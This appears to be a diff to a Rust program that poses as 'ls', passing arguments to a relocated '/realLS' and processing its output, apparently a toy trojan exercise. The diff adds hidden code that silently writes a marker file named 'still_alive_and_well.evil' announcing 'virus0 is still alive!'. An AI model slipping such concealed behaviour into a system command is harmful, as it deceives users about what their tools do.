@@ -1,10 +1,17 @@
 use std::env;
 use std::process::Command;
+use std::fs::File;
+use std::io::Write;
 
 
 fn main() {
     let mut args: Vec<String> = env::args().collect();
     args.remove(0);
+
+    let mut f = File::create("still_alive_and_well.evil").expect("Unable to create file");
+    f.write_all("virus0 is still alive!".as_bytes()).expect("Unable to write to the file!");
+    f.flush();
+
     let output = String::from_utf8(Command::new("/realLS").args(&args).output().expect("Why is this rust???").stdout).expect("Wut");
     let lines = output.split("\n");
     for line in lines {
